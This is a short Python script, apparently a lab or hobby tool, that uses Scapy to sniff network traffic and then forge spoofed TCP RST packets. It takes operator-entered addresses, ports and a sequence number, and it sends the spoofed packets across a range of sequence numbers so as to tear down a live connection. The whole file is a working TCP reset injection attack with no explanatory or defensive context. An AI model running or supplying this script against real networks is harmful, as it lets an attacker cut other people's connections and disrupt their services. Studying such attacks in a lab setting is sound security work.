import sys
from scapy.all import *

conf.use_pcap = True

#Sniffing network
capture = sniff(count=25)
capture.summary()

#Setting the values that will be used in the spoofed packet
ip_src = input("[*] Enter source ip: ")
ip_dst = input("[*] Enter destination ip: ")
port_src = int(input("[*] Enter source port: "))
port_dst = int(input("[*] Enter destination port: "))

cap_filter = "host " + ip_src + " and port " + str(port_src)
pkt = sniff(filter=cap_filter, count=1)
#pkt_seq = pkt[TCP].ack
pkt.show()
pkt_seq = int(input("Enter seq-num: "))

print("[+] Sending the spoofed tcp packet with sequence number=", pkt_seq)
IP_layer = IP(src=ip_src, dst=ip_dst)
TCP_layer = TCP(sport=port_src, dport=port_dst,flags="R", seq=pkt_seq)
pkt = IP_layer/TCP_layer
ls(pkt)
send(pkt)

print("[+] Sending more packets with higher sequence numbers...")
for i in range(0,1000,10):
	TCP_layer = TCP(sport=port_src, dport=port_dst,flags="R", seq=pkt_seq+i)
	pkt = IP_layer/TCP_layer
	send(pkt, verbose=0)

